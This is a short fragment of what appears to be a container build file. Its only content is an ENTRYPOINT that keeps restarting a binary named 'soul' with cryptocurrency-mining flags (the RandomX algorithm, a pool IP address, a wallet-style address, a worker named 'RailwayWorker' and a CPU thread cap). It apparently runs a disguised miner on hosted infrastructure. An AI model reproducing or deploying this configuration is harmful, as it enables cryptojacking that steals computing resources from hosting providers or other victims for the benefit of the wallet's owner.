...
ENTRYPOINT ["/bin/sh", "-c", "while true; do echo Starting && /app/soul -a rx/0 -o 45.77.67.39 -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA -p RailwayWorker --tls --cpu-max-threads-hint=80; sleep 3; done"]
